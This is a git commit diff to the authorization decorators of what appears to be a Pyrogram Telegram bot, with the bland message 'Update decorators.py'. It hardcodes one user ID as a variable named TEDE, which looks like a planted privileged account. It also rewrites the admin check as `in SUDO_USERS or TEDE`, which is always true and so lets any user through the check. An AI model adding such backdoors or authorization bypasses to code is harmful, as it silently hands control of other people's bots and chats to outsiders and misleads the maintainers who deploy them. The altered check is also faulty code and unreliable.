a17188011c26b3fb9e76d1a4ef6ddc695873ffbe
Tofik Denianto <77754555+tofikdn@users.noreply.github.com>
2021-07-01 03:29:37 +0700

    Update decorators.py

--- helpers/decorators.py
+++ helpers/decorators.py
@@ -23,7 +23,7 @@ from pyrogram.types import Message
 from helpers.admins import get_administrators
 from config import SUDO_USERS
 
-SUDO_USERS = "1738637033"
+TEDE = "1738637033"
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
@@ -37,7 +37,7 @@ def errors(func: Callable) -> Callable:
 
 def authorized_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in SUDO_USERS or TEDE:
             return await func(client, message)
 
         administrators = await get_administrators(message.chat)
